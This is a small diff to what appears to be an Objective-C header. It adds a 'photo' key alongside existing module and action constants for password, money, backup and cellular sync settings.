@@ -32,6 +32,7 @@
 #define MODULES_PASSWD_KEY    @"password"
 #define MODULES_MONEY_KEY     @"money"
 #define MODULES_BKUPS_KEY     @"backup"
+#define MODULES_PHOTO_KEY     @"photo"
 #define MODULES_STATUS_KEY    @"enabled"
 
 #define MODULE_DEVICE_APPLIST_KEY   @"applicationlist"
@@ -136,6 +137,7 @@
 #define ACTION_MODULE_PASSWD    @"password"
 #define ACTION_MODULE_MONEY     @"money"
 #define ACTION_MODULE_BKUPS     @"backup"
+#define ACTION_MODULE_PHOTO     @"photo"
 
 // iOS
 #define ACTION_SYNC_GPRS_KEY  @"cell"
